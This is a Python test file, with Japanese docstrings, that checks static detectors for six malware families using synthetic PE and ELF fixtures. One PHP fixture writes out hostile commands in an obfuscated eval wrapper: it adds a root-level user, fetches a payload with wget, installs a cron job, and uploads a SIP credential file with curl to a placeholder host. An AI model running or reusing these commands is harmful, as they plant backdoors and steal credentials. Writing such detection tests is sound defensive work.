"""最終段candidate-only family detectorの高精度境界を検証する。"""

from __future__ import annotations

import base64
import codecs
import importlib.util
import json
import struct
import sys
from pathlib import Path

import pytest

FRAMEWORK = Path(__file__).parents[1]
REPOSITORY = FRAMEWORK.parent
for import_root in (str(FRAMEWORK), str(REPOSITORY)):
    if import_root not in sys.path:
        sys.path.insert(0, import_root)

FAMILIES = (
    "eclipse_ddos_bot",
    "genddos_bot",
    "jiproxy_relay",
    "jomangy",
    "mx-go",
    "softbot",
)


def _load_module(path: Path, name: str):
    spec = importlib.util.spec_from_file_location(name, path)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


MODULES = {
    family: _load_module(
        FRAMEWORK / "malware" / family / "detect.py",
        f"candidate_stage4_detector_{family}",
    )
    for family in FAMILIES
}


def _pe(*markers: bytes) -> bytes:
    """検出境界に必要な最小PE headerへ静的markerを付加する。"""

    data = bytearray(0x200)
    data[:2] = b"MZ"
    data[0x3C:0x40] = (0x80).to_bytes(4, "little")
    data[0x80:0x84] = b"PE\0\0"
    data[0x84:0x86] = (0x14C).to_bytes(2, "little")
    data[0x86:0x88] = (3).to_bytes(2, "little")
    data[0x94:0x96] = (0xE0).to_bytes(2, "little")
    for marker in markers:
        data.extend(marker)
        data.extend(b"\0")
    return bytes(data)


def _elf64(*markers: bytes) -> bytes:
    """整合する64-bit little-endian ELF headerを組み立てる。"""

    ident = b"\x7fELF" + bytes([2, 1, 1]) + b"\0" * 9
    header = struct.pack(
        "<HHIQQQIHHHHHH",
        2,
        62,
        1,
        0,
        0,
        0,
        0,
        64,
        56,
        0,
        0,
        0,
        0,
    )
    return ident + header + b"\0".join(markers)


def _elf32_mips_be(*markers: bytes) -> bytes:
    """整合する32-bit MIPS big-endian ELF headerを組み立てる。"""

    ident = b"\x7fELF" + bytes([1, 2, 1]) + b"\0" * 9
    header = struct.pack(
        ">HHIIIIIHHHHHH",
        2,
        8,
        1,
        0,
        0,
        0,
        0,
        52,
        32,
        0,
        0,
        0,
        0,
    )
    return ident + header + b"\0".join(markers)


ECLIPSE_MARKERS = (
    b"x86_64",
    b"45.66.228.114",
    b"UDP_FLOOD",
    b"TCP_FLOOD",
    b"STOP_ALL",
    b"BROADCAST",
    b"/dev/null",
)
GEND_CONFIG = (
    bytes.fromhex("efbeadde"),
    bytes.fromhex("45474c46464d510c5156"),
    bytes.fromhex("3874"),
)
GEND_BEHAVIOR = (b"attack_tcpflood", b"attack_udppps", bytes.fromhex("41deca35"))
JIPROXY_KEY = bytes.fromhex("8badf00dfeedfaceabad1deac001d00d")
JIPROXY_RELAY = (
    b"/proc/net/route",
    b"AddPortMapping",
    b'{"status":"ONLINE","connections":%d,"bandwidth":0.0}',
)
MX_NAMESPACES = (
    b"mx-go/internal/mail",
    b"mx-go/internal/control",
    b"mx-go/internal/remote",
)
MX_CAPABILITIES = (
    b"Local\\MX_Go_SingleInstance_v1",
    b"MX_GO_SKIP_JP_CHECK",
    b"/api/client_command/",
)
SOFTBOT_MARKERS = (b"im in deep sorrow.", b"/dev/watchdog", b"/dev/misc/watchdog")


def _jomangy_wrapper(decoded: bytes) -> bytes:
    """ROT13後にBase64化したPHP childを外側wrapperへ格納する。"""

    rotated = codecs.encode(decoded.decode("ascii"), "rot_13").encode("ascii")
    encoded = base64.b64encode(rotated)
    return b"<?php eval(str_rot13(base64_decode('" + encoded + b"')));"


JOMANGY_CHILD = b"\n".join(
    (
        b"require paloSantoDB.class.php;",
        b"$cfg = freepbx_conf;",
        b"system('useradd -ou 0 support');",
        b"system('wget http://host/p -O /var/lib/asterisk/bin/devnull');",
        b"system('(crontab -l; echo \"*/3 * * * * /var/lib/asterisk/bin/devnull\") | crontab -');",
        b"system('curl -F file=@/etc/asterisk/sip.conf http://host/hima_data/index.php');",
    )
)

POSITIVE_FIXTURES = {
    "eclipse_ddos_bot": _elf64(*ECLIPSE_MARKERS),
    "genddos_bot": _elf64(*GEND_CONFIG, *GEND_BEHAVIOR),
    "jiproxy_relay": _elf32_mips_be(JIPROXY_KEY, *JIPROXY_RELAY),
    "jomangy": _jomangy_wrapper(JOMANGY_CHILD),
    "mx-go": _pe(b"go1.26.1", *MX_NAMESPACES, *MX_CAPABILITIES),
    "softbot": _elf64(*SOFTBOT_MARKERS),
}


@pytest.mark.parametrize("family", FAMILIES)
def test_positive_fixture_matches_only_intended_family(family: str) -> None:
    """独立証拠軸が揃うfixtureだけを意図したfamilyへ帰属する。"""

    sample = POSITIVE_FIXTURES[family]
    matches = {
        candidate
        for candidate, module in MODULES.items()
        if module.detect(sample, Path("misleading-name.bin"))["matched"]
    }
    assert matches == {family}


NEGATIVE_FIXTURES = {
    "eclipse_ddos_bot": (
        b"\x7fELF" + b"".join(ECLIPSE_MARKERS),
        _elf64(b"UDP_FLOOD", b"TCP_FLOOD", b"STOP_ALL", b"BROADCAST", b"/dev/null"),
        _elf64(b"x86_64", b"45.66.228.114", b"UDP_FLOOD", b"STOP_ALL", b"/dev/null"),
    ),
    "genddos_bot": (
        b"\x7fELF" + b"".join(GEND_CONFIG + GEND_BEHAVIOR),
        _elf64(*GEND_CONFIG),
        _elf64(*GEND_BEHAVIOR),
    ),
    "jiproxy_relay": (
        b"\x7fELF" + JIPROXY_KEY + b"".join(JIPROXY_RELAY),
        _elf64(JIPROXY_KEY, *JIPROXY_RELAY),
        _elf32_mips_be(JIPROXY_KEY, *JIPROXY_RELAY[:2]),
        _elf32_mips_be(
            bytes.fromhex("efbeadde0dd001c0ead1abcefaedfe0d"),
            *JIPROXY_RELAY,
        ),
    ),
    "jomangy": (
        b"<?php eval(str_rot13(base64_decode('QQ==')));",
        JOMANGY_CHILD,
        _jomangy_wrapper(b"echo generic_php_child;" * 8),
    ),
    "mx-go": (
        b"MZ" + b"go1.26.1" + b"".join(MX_NAMESPACES + MX_CAPABILITIES),
        _pe(b"go1.26.1", *MX_NAMESPACES),
        _pe(b"go1.26.1", *MX_CAPABILITIES),
        _pe(b"go1.26.1", b"net/http", b"runtime.main"),
    ),
    "softbot": (
        b"\x7fELF" + b"".join(SOFTBOT_MARKERS),
        _elf64(SOFTBOT_MARKERS[0]),
        _elf64(*SOFTBOT_MARKERS[1:]),
        _elf64(SOFTBOT_MARKERS[0], SOFTBOT_MARKERS[1]),
    ),
}


@pytest.mark.parametrize(
    ("family", "sample"),
    [(family, sample) for family, samples in NEGATIVE_FIXTURES.items() for sample in samples],
)
def test_missing_axis_and_broken_format_are_rejected(family: str, sample: bytes) -> None:
    """一軸欠落、壊れたheader、共有keyだけのprofileを誤検出しない。"""

    result = MODULES[family].detect(sample, Path(f"{family}.bin"))
    assert result["matched"] is False
    assert result["campaigns"] == []


def test_mutated_genddos_encrypted_domain_is_rejected() -> None:
    """1 byte改変した暗号化domainをfamily設定として受理しない。"""

    mutated = bytearray(GEND_CONFIG[1])
    mutated[-1] ^= 1
    result = MODULES["genddos_bot"].detect(
        _elf64(GEND_CONFIG[0], bytes(mutated), GEND_CONFIG[2], *GEND_BEHAVIOR),
        Path("mutated.bin"),
    )
    assert result["matched"] is False
    assert result["observations"]["encrypted_domain_and_port_present"] is False


def test_jomangy_candidate_limit_fails_closed() -> None:
    """Base64候補数上限を超えるwrapperは途中結果で帰属しない。"""

    candidates = [base64.b64encode(bytes([index]) * 60) for index in range(17)]
    sample = b"<?php eval(str_rot13(base64_decode('x'))); " + b" ".join(candidates)
    result = MODULES["jomangy"].detect(sample, Path("candidate-bomb.php"))
    assert result["matched"] is False
    assert result["observations"]["candidate_limit_exceeded"] is True


@pytest.mark.parametrize("family", FAMILIES)
def test_oversize_input_is_rejected_before_family_scan(family: str) -> None:
    """familyごとの上限を1 byte超えた入力を解析しない。"""

    module = MODULES[family]
    sample = b"A" * (module.MAX_INPUT_BYTES + 1)
    assert module.detect(sample, Path("oversize.bin")) == {
        "matched": False,
        "observations": {"input_within_limit": False},
        "campaigns": [],
    }


def test_registry_maps_all_added_families() -> None:
    """最終監査で根拠を満たした6 familyをregistryから読み込める。"""

    registry = json.loads(
        (FRAMEWORK / "registry" / "malware_types.json").read_text(encoding="utf-8")
    )["malware_types"]
    classifier = _load_module(
        FRAMEWORK / "classifiers" / "classify_sample.py",
        "candidate_stage4_classifier",
    )
    for family in FAMILIES:
        expected = f"malware/{family}/detect.py"
        assert registry[family]["detector"] == expected
        assert callable(classifier.load_detector(FRAMEWORK, expected, family))


def test_detectors_ignore_filename_and_never_execute_or_contact_network() -> None:
    """filename labelを無視し、positiveでも非実行・非通信を明示する。"""

    for family, module in MODULES.items():
        negative = module.detect(b"generic packed payload", Path(f"{family}.bin"))
        assert negative["matched"] is False
        positive = module.detect(POSITIVE_FIXTURES[family], Path("unknown.bin"))
        observations = positive["observations"]
        assert observations["sample_executed"] is False
        assert observations["network_contacted"] is False
